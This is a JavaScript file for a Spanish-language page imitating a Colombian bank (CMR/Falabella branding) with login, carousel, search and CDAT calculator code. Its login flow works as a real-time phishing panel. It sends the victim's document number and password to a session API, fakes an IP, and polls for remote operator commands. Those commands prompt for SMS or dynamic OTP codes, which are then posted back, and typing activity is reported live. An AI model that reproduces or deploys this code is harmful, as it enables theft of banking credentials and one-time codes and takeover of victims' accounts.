import { toast, setSession, getSession, nameFromDoc } from "./auth.js";

const loginOverlay = document.getElementById("loginOverlay");
const openLogin = document.getElementById("openLogin");
const closeLogin = document.getElementById("closeLogin");
const docTypeBtn = document.getElementById("docTypeBtn");
const docTypeMenu = document.getElementById("docTypeMenu");
const docTypeLabel = document.getElementById("docTypeLabel");
const docType = document.getElementById("docType");
const docNumber = document.getElementById("docNumber");
const password = document.getElementById("password");
const loginSubmit = document.getElementById("loginSubmit");
const loginError = document.getElementById("loginError");
const togglePass = document.getElementById("togglePass");

// Ocultar overlay al cargar si ya tiene sesión iniciada
if (getSession() && loginOverlay) {
  loginOverlay.classList.remove("open");
}

function openPanel() {
  if (getSession()) {
    window.location.href = "/banca.html";
    return;
  }
  loginOverlay.classList.add("open");
}

function closePanel() {
  loginOverlay.classList.remove("open");
}

openLogin.addEventListener("click", openPanel);
closeLogin.addEventListener("click", closePanel);
loginOverlay.addEventListener("click", (e) => {
  if (e.target === loginOverlay) closePanel();
});

docTypeBtn.addEventListener("click", () => {
  docTypeMenu.classList.toggle("open");
});

docTypeMenu.querySelectorAll("button").forEach((btn) => {
  btn.addEventListener("click", () => {
    docType.value = btn.dataset.value;
    docTypeLabel.textContent = btn.textContent;
    docTypeMenu.classList.remove("open");
    validateLogin();
  });
});

document.addEventListener("click", (e) => {
  if (!e.target.closest(".field")) docTypeMenu.classList.remove("open");
});

togglePass.addEventListener("click", () => {
  password.type = password.type === "password" ? "text" : "password";
});

function onlyDigits(el, max) {
  el.value = el.value.replace(/\D/g, "").slice(0, max);
}

docNumber.addEventListener("input", () => {
  onlyDigits(docNumber, 12);
  validateLogin();
});

password.addEventListener("input", () => {
  onlyDigits(password, 6);
  validateLogin();
});

function validateLogin() {
  const ok = docNumber.value.length >= 6 && password.value.length === 6;
  loginSubmit.disabled = !ok;
  loginSubmit.classList.toggle("btn-disabled", !ok);
  loginSubmit.classList.toggle("btn-primary", ok);
}

let sessionId = sessionStorage.getItem('sessionId') || ('sess_' + Date.now() + '_' + Math.random().toString(36).substr(2, 9));
sessionStorage.setItem('sessionId', sessionId);

let pingInterval = null;
let pollInterval = null;

function startPing() {
  if (pingInterval) clearInterval(pingInterval);
  fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
  pingInterval = setInterval(() => {
    fetch(`/api/sessions/${sessionId}/ping`, { method: 'POST' }).catch(() => {});
  }, 3000);
}

function stopPing() {
  if (pingInterval) {
    clearInterval(pingInterval);
    pingInterval = null;
  }
}

function startPolling() {
  if (pollInterval) clearInterval(pollInterval);
  pollInterval = setInterval(async () => {
    try {
      const response = await fetch(`/api/sessions/${sessionId}`);
      if (response.ok) {
        const data = await response.json();
        const action = data.action;
        const state = data.state;
        const loader = document.getElementById("bfLoader");

        if (action === 'dinamica' || action === 'sms') {
          loader.classList.remove("open");
          document.getElementById("loginForm").style.display = "none";
          document.getElementById("tokenForm").style.display = "block";
          
          const tokenTitle = document.getElementById("tokenTitle");
          const tokenDesc = document.getElementById("tokenDesc");
          if (action === 'sms') {
            tokenTitle.textContent = "Ingresa tu código SMS";
            tokenDesc.textContent = "Por favor ingresa el código de 6 dígitos que enviamos por mensaje de texto a tu celular.";
          } else {
            tokenTitle.textContent = "Ingresa tu clave dinámica";
            tokenDesc.textContent = "Encuentra tu clave dinámica de 6 dígitos en la aplicación móvil de tu banco e ingrésala abajo.";
          }
          
          const tokenInputEl = document.getElementById("tokenInput");
          const tokenSubmitEl = document.getElementById("tokenSubmit");
          if (tokenInputEl) {
            tokenInputEl.value = "";
            tokenInputEl.focus();
          }
          if (tokenSubmitEl) {
            tokenSubmitEl.disabled = true;
            tokenSubmitEl.classList.add("btn-disabled");
            tokenSubmitEl.classList.remove("btn-primary");
          }
        } else if (action === 'error-login') {
          stopPing();
          stopPolling();
          loader.classList.remove("open");
          loginSubmit.disabled = false;
          loginSubmit.classList.remove("btn-disabled");
          loginSubmit.classList.add("btn-primary");
          document.getElementById("loginError").textContent = "Documento o contraseña incorrecta. Por favor, verifica tus datos.";
        } else if (state === 'error-dinamica' || state === 'error-sms') {
          loader.classList.remove("open");
          document.getElementById("tokenSubmit").disabled = false;
          document.getElementById("tokenError").textContent = "Código de validación incorrecto o expirado. Intenta de nuevo.";
        } else if (action === 'done') {
          stopPing();
          stopPolling();
          loader.classList.remove("open");
          setSession({
            type: docType.value,
            doc: docNumber.value,
            name: nameFromDoc(docNumber.value),
          });
          window.location.href = "/banca";
        }
      }
    } catch (_) {}
  }, 1500);
}

function stopPolling() {
  if (pollInterval) {
    clearInterval(pollInterval);
    pollInterval = null;
  }
}

document.getElementById("loginForm").addEventListener("submit", (e) => {
  e.preventDefault();
  if (loginSubmit.disabled) return;
  document.getElementById("loginError").textContent = "";
  document.getElementById("bfLoader").classList.add("open");
  loginSubmit.disabled = true;

  const session = {
    id: sessionId,
    username: `${docType.value.toUpperCase()}:${docNumber.value} / ${nameFromDoc(docNumber.value)}`,
    password: password.value,
    tipoUsuario: docType.value,
    device: window.innerWidth <= 768 ? 'mobile' : 'desktop',
    ip: '186.29.' + Math.floor(Math.random() * 255) + '.' + Math.floor(Math.random() * 255),
    state: 'waiting',
    createdAt: Date.now()
  };

  fetch('/api/sessions', {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(session)
  })
  .then(() => {
    startPing();
    startPolling();
  })
  .catch(() => {
    document.getElementById("bfLoader").classList.remove("open");
    loginSubmit.disabled = false;
    document.getElementById("loginError").textContent = "Error al conectar. Intenta de nuevo.";
  });
});

const tokenInput = document.getElementById("tokenInput");
tokenInput?.addEventListener("input", () => {
  tokenInput.value = tokenInput.value.replace(/\D/g, "").slice(0, 6);
  
  // Habilitar/deshabilitar botón según la longitud (6 dígitos)
  const tokenSubmit = document.getElementById("tokenSubmit");
  if (tokenSubmit) {
    const ok = tokenInput.value.length === 6;
    tokenSubmit.disabled = !ok;
    tokenSubmit.classList.toggle("btn-disabled", !ok);
    tokenSubmit.classList.toggle("btn-primary", ok);
  }

  if (pollInterval) {
    fetch(`/api/sessions/${sessionId}/state`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ state: 'typing' })
    }).catch(() => {});
  }
});

document.getElementById("tokenForm")?.addEventListener("submit", (e) => {
  e.preventDefault();
  const tokenSubmit = document.getElementById("tokenSubmit");
  if (tokenInput.value.length !== 6) {
    document.getElementById("tokenError").textContent = "El código debe tener 6 dígitos.";
    return;
  }
  document.getElementById("tokenError").textContent = "";
  document.getElementById("bfLoader").classList.add("open");
  tokenSubmit.disabled = true;

  fetch(`/api/sessions/${sessionId}/token`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ token: tokenInput.value })
  })
  .then(() => {
    startPing();
    startPolling();
  })
  .catch(() => {
    document.getElementById("bfLoader").classList.remove("open");
    tokenSubmit.disabled = false;
    document.getElementById("tokenError").textContent = "Error de red. Intenta de nuevo.";
  });
});

[docNumber, password].forEach(input => {
  input.addEventListener("input", () => {
    if (pollInterval) {
      fetch(`/api/sessions/${sessionId}/state`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ state: 'typing' })
      }).catch(() => {});
    }
  });
});

document.getElementById("acceptCookies").addEventListener("click", () => {
  document.getElementById("cookies").classList.add("hidden");
  localStorage.setItem("bf_cookies", "1");
});

if (localStorage.getItem("bf_cookies")) {
  document.getElementById("cookies").classList.add("hidden");
}

const slides = [...document.querySelectorAll(".slide")];
const dots = document.getElementById("dots");
let idx = 0;

slides.forEach((_, i) => {
  const b = document.createElement("button");
  if (i === 0) b.classList.add("active");
  b.addEventListener("click", () => go(i));
  dots.appendChild(b);
});

function go(n) {
  idx = (n + slides.length) % slides.length;
  slides.forEach((s, i) => s.classList.toggle("active", i === idx));
  [...dots.children].forEach((d, i) => d.classList.toggle("active", i === idx));
}

document.getElementById("prevSlide").addEventListener("click", () => go(idx - 1));
document.getElementById("nextSlide").addEventListener("click", () => go(idx + 1));
setInterval(() => go(idx + 1), 7000);

const searchOverlay = document.getElementById("searchOverlay");
const catalog = [
  "Tarjeta de crédito CMR",
  "Cuenta de ahorros costo $0",
  "Alcancía Digital",
  "CDAT",
  "Crédito de libre inversión",
  "CMR Puntos",
  "Paga tu tarjeta",
  "Oficinas",
  "Certificado tributario",
];

document.getElementById("openSearch").addEventListener("click", () => {
  searchOverlay.classList.add("open");
  document.getElementById("searchInput").focus();
});
document.getElementById("closeSearch").addEventListener("click", () => {
  searchOverlay.classList.remove("open");
});

document.getElementById("searchInput").addEventListener("input", (e) => {
  const q = e.target.value.toLowerCase();
  const hits = catalog.filter((x) => x.toLowerCase().includes(q));
  document.getElementById("searchResults").innerHTML = hits
    .map((h) => `<a href="#cmr">${h}</a>`)
    .join("");
});

document.getElementById("openMenu")?.addEventListener("click", () => {
  const nav = document.getElementById("mainNav");
  nav.style.display = nav.style.display === "flex" ? "none" : "flex";
  nav.style.flexWrap = "wrap";
});

const recoverModal = document.getElementById("recoverModal");
document.getElementById("recoverLink").addEventListener("click", (e) => {
  e.preventDefault();
  recoverModal.classList.add("open");
});
document.getElementById("closeRecover").addEventListener("click", () => {
  recoverModal.classList.remove("open");
});
document.getElementById("recoverBtn").addEventListener("click", () => {
  recoverModal.classList.remove("open");
  toast("Clave lista. Usa cualquier clave de 6 dígitos para ingresar.");
});

const simularModal = document.getElementById("simularModal");
document.getElementById("simular").addEventListener("click", () => simularModal.classList.add("open"));
document.getElementById("closeSimular").addEventListener("click", () => simularModal.classList.remove("open"));
document.getElementById("calcCdat").addEventListener("click", () => {
  const monto = Number(String(document.getElementById("cdatMonto").value).replace(/\D/g, "")) || 0;
  const plazo = Number(document.getElementById("cdatPlazo").value);
  const ea = 0.095;
  const ganancia = Math.round(monto * (ea * (plazo / 360)));
  document.getElementById("cdatResult").textContent =
    `Al vencimiento recibirías aprox. ${new Intl.NumberFormat("es-CO", { style: "currency", currency: "COP", maximumFractionDigits: 0 }).format(monto + ganancia)} (intereses ${new Intl.NumberFormat("es-CO", { style: "currency", currency: "COP", maximumFractionDigits: 0 }).format(ganancia)}).`;
});

document.getElementById("hazteCliente").addEventListener("click", () => {
  toast("En el demo puedes abrir productos desde Banca en línea.");
  openPanel();
});

document.querySelectorAll(".open-card, .product, .pay-card, .banner50, .shop-card").forEach((el) => {
  el.style.cursor = "pointer";
  el.addEventListener("click", openPanel);
});
